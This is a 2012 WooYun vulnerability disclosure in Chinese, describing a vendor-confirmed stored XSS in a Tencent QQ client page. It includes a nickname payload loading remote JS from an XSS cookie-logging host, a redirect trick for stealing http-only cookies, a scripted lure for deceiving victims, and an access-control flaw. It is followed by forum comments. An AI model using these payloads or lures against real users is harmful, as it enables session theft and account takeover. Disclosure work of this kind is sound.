{"id": 15975, "wybug_id": "wooyun-2012-013563", "wybug_title": "PKAV腾讯专场 - 3. 腾讯QQ客户端某处功能页面存储型XSS", "wybug_corp": "腾讯", "wybug_author": "only_guest", "wybug_date": "2012-10-19 12:10", "wybug_open_date": "2012-12-03 12:11", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-10-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-10-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-10-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-11-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-11-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-12-03：\t细节向公众公开  简要描述： QQ客户端某处页面没过滤好，导致可被利用XSS。漏洞相关信息，会同步至pkav.net。 详细说明：  QQ里很多地方都是嵌入的网页，所以我们对这些嵌入的网页系统的进行了分析。而后，发现在手机生活这个功能页面中，昵称处未过滤，从而导致XSS。1. 漏洞页面，个人资料，手机生活页面。2. QQ用户昵称有一定的长度限制。为了在某种程度上绕过这种限制，我们利用之前在某漏洞中已经使用过的技巧，从webQQ来修改用户的昵称，将昵称修改为：<script src=//xsser.me/xxxxx> 即可。（因为昵称后方有 </script>闭合，因此利用代码无需加</script>）\n\n3. 可以看到当用户打开页面，页面执行了我们指定的JS文件。\n\n 页面内的昵称没有被过滤\n\n4. 用自己大号访问小号的个人资料--手机生活页面时。触发XSS，导致信息被记录。\n\n弹个窗\n\n5. 此次发布漏洞时，小号可成功利用登录信息来登录大号。 但是在之前测试时，发现此页面的cookie加了http-only，不知道现在为何又没了？挺奇怪。\n\n6. 不过即使是之前加了http-only的情况，我们依然可以通过跳转到腾讯旗下任意一个反射型XSS，来间接获取到用户的cookies信息。\nif(location.href.indexOf(\"m.qq.com\")>-1){ location.href=\"反射型XSS地址\"; }\n7. 至于漏洞利用方法。A. 诱使用户访问你的个人资料-手机生活页面。 至于怎么骗，看各人自己口才了，比如我会说：“hey, 帮我看看我的手机生活页面，为什么我能看到别人的，看不到我自己的啊，你那边能看到吗？我这边显示一片空白。。不知道是不是我网络问题啊。”B. http://m.qq.com/client/cguest?frienduin=10001 这个页面本身没有做好有判定，因此任何人都可以访问到任何人的手机生活页面。比如上面是pony的手机生活页面。因而，http://m.qq.com/client/cguest?frienduin=带有XSS的QQ号码， 这个页面将可以直接用来作为XSS页面发送给受害者。   漏洞证明：  见详细说明   修复方案：  昵称输出过滤   版权声明：转载请注明来源 only_guest@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2012-10-19 16:00 厂商回复： 非常感谢您的报告。我们会马上安排专人跟进确认处理，有新的情况会及时同步 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-10-19 12:13 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  沙发～～    \n     2012-10-19 12:15 |    \t\tupload \t\t\t( 普通白帽子  |\t\t\t        Rank:251 漏洞数:43        | 此处略--！)\t\t \n  沙发2～～    \n     2012-10-19 12:16 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  沙发3~~    \n     2012-10-19 12:17 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  我觉得这些人将是乌云里最富有的人～    \n     2012-10-19 12:22 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  越来越有意思了O(∩_∩)O    \n     2012-10-19 12:33 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  tencent hot!    \n     2012-10-19 13:09 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  围观~    \n     2012-10-19 13:12 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  继续围观。    \n     2012-10-19 13:37 |    \t\t猥琐 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 学习什么的最重要！)\t\t \n  一部分人先富起来，带动剩下的富起来    \n     2012-10-19 13:44 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  碉堡了！@xsser 我是贫穷苦逼的胖子！    \n     2012-10-19 14:21 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @xsser 咱们聊聊中国足球吧 ？！    \n     2012-10-19 15:48 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  8点起床就开始搞，我勒去。。。    \n     2012-10-19 16:01 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @zeracker 身为PKAV核心的你是不是要做点什么..    \n     2012-10-19 18:43 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @only_guest 。。。。。。。。。最近工作忒忙了，俺能干点什么呢。    \n     2012-10-19 23:13 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @zeracker 你懂的.继续连载    \n     2012-10-24 22:32 |    \t\tCr4zy \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | 贫民)\t\t \n  看不到东西 不过好像很牛逼的样子    \n     2012-10-27 00:20 |    \t\t戏子_AINI \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:7        | 我是一只小小小小鸟，想要飞却飞也飞不高。...)\t\t \n  @only_guest 过客哥哥 我终于也来到乌云打酱油了~~o(>_<)o ~~~~o(>_<)o ~~~~o(>_<)o ~~~~o(>_<)o ~~    \n     2012-10-29 20:48 |    \t\tonly_guest  \t\t\t( 普通白帽子  |\t\t\t        Rank:800 漏洞数:75        | PKAV技术宅社区-专心做技术.PKAV已经暂停...)\t\t \n  @戏子_AINI 你是?    \n     2012-11-03 23:21 |    \t\t戏子_AINI \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:7        | 我是一只小小小小鸟，想要飞却飞也飞不高。...)\t\t \n  @only_guest 红黑YY上的戏子    \n     2012-11-26 01:50 |    \t\t猴子 \t\t\t( 路人 |\t\t\t        Rank:19 漏洞数:5        | 我是一只骚猴子)\t\t \n  很牛逼的样子    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}